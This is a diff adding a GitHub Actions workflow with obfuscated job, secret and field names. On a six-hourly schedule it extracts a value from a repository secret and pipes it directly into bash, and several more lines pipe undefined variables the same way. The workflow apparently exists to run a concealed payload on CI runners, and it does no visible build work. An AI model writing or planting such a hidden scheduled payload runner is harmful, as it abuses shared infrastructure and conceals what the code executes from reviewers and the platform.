@@ -1,0 +1,25 @@
+name: luorenzong1098
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: luorenzong1098
+        env:
+          y37857: ${{ secrets.y37857 }}
+        run: |
+          echo $y37857 | jq -r .fve08039 | /bin/bash
+          echo $yn538 | jq -r .sr8 | /bin/bash
+          echo $llz028 | jq -r .jonki5 | /bin/bash
+          echo $lkmgh1 | jq -r .lpqk7 | /bin/bash
+          echo $pfjwn5 | jq -r .psrwn60 | /bin/bash
+          echo $o94741 | jq -r .g9873 | /bin/bash
+          echo $zfumr279 | jq -r .qcp651 | /bin/bash
+
